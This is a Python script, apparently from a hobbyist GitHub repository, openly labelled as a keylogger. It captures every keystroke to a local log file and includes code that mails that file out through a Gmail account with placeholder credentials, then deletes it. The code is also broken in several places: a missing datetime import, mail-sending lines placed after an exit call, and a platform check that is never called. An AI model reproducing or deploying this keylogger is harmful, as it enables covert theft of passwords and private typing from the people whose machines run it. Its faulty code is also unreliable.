"""
Author: @new92
Keylogger: Program for Capturing Everything User Is Typing
The author has no responsibility for the use of this program
"""
#Imports
try:
    import time
    import platform
    from os import system
    import os
    import sys
    import keyboard
    import gmail
    import art
    from art import tprint
    from pynput.keyboard import Key, Listener
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(2)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")

#Logo
tprint("KEYLOGGER",font="tarty1")

#Main Program

print("\n")
print("[+] Github: @new92")
print("\n")
print("[1] Initiate Keylogger")
print("[2] Exit")
option=int(input("[::] Please enter the option: "))
while option <= 0 or option > 2:
    print("[!] Invalid Option !")
    time.sleep(1)
    option=int(input("[::] Please enter again the option: "))
if option == 1:
    time.sleep(1)
    print("[+] Keylogger Initiated...")
    KEYS=[]
#Defs
    def OnPress(key):
        KEYS.append(key)
        WriteToFile(KEYS)
        print("[+] Key --> {0} --> Pressed".format(key))

    def OnRel(key):
        print("[+] Key --> {0} --> Released".format(key))

    def WriteToFile(KEYS):
        with open("log.txt","a") as f:
            for key in KEYS:
                keyword = str(key).replace("'","")
                f.write(keyword)
                f.write("\n")
    with Listener(on_press = OnPress, on_release = OnRel) as listen:
        listen.join()

    datentime = datetime.datetime.now()

    cur_time = datentime.strftime("%H:%M:%S")

    if cur_time == "00:00:00":
        exit(0)
        gmail1 = gmail.Gmail("enteryouremailhere@","enteryourpasswordhere")
        message = gmail.Message("Log",to="enteryouremailhere@",attachments=["log.txt"])
        gmail1.send(message)
        time.sleep(2)
        os.remove("log.txt")
    else:
        pass
else:
    print("[+] Exiting...")
    exit(0)
